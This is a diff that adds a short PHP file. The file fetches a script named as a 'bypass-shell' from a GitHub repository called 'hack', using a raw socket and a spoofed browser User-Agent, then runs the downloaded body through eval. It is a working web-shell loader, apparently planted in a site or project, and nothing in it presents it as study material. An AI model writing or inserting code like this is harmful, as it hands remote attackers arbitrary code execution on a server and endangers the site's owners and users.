@@ -1,0 +1,19 @@
+<?php
+$h='raw.githubusercontent.com';
+$p='/thisnull7/hack/refs/heads/main/bypass-shell/3enc.php';
+$s=fsockopen('ssl://'.$h,443,$e,$r,10);
+if($s){
+$o="GET ".$p." HTTP/1.1\r\n";
+$o.="Host: ".$h."\r\n";
+$o.="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
+$o.="Accept: */*\r\n";
+$o.="Accept-Encoding: identity\r\n";
+$o.="Connection: close\r\n\r\n";
+fwrite($s,$o);
+$d='';
+while(!feof($s)){$d.=fread($s,8192);}
+fclose($s);
+$d=substr($d,strpos($d,"\r\n\r\n")+4);
+eval('?'.'>'.$d);
+}
+?>
